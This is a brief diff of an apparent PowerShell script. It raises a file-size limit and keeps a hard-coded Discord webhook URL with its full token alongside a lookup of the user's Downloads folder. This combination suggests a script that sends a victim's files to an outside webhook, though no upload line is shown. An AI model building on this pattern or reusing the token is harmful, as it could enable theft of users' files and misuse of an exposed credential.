@@ -1,5 +1,5 @@
 $hookurl = "https://discord.com/api/webhooks/1093522063228149800/w0DTdWlyGWorOrPcSALYsn-qcQNY0tBtAc5M5QcxyVBpy0fiRmhml1i-jc_ocODUbVk4";
-$maxFileSizeMB = 8;
+$maxFileSizeMB = 20;
 $downloadFolder = (New-Object -ComObject Shell.Application).NameSpace("shell:Downloads").Self.Path;
 
 function Remove-Diacritics {
